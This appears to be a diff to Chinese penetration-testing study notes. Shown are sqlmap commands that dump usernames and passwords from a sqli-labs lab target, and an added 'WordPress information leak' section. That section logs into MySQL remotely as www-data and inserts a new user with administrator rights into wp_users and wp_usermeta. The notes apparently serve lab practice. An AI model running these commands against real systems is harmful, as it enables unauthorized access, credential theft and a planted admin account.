@@ -124,6 +124,28 @@ python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms 
 python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users -C username,password（字段名） --dump --batch -v 0    //爆值
 ```
 
+* ### CVE
+
+* #### wordpress信息泄露
+
+远程连接mysql数据库
+
+```
+mysql -h 靶机ip -P 8500 -u www-data
+```
+
+作为访客身份远程登录，www-data对wordpress库拥有select和insert权限
+
+通过查看并向表wp\_users中插入新用户和密码完成用户定义
+
+```
+select id,user_login,user_pass from wp_users;   //查看wp_users内部信息
+insert into wp_users (id,user_login,user_pass,user_status) value(2,'leon','e10adc3949ba59abbe56e057f20f883e',0);
+//密码123456
+insert into wp_usermeta value(22,2,'wp_capabilities','a:1:{s:13:"administrator";b:1;}');  //修改usermeta表内的用户权限
+insert into wp_usermeta value(23,2,'wp_user_level','10');
+```
+
 * #### 推荐练习环境
 * SQLi Labs
 
